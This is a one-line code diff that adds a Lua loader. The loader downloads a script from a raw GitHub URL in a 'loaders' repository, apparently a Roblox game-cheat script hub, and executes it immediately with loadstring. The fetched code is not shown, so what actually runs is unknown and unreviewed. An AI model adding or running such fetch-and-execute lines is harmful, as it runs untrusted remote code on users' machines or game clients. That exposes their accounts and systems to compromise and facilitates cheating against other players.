@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/slayers-2-spam3-gh5898pgdzu1u1.lua"))()
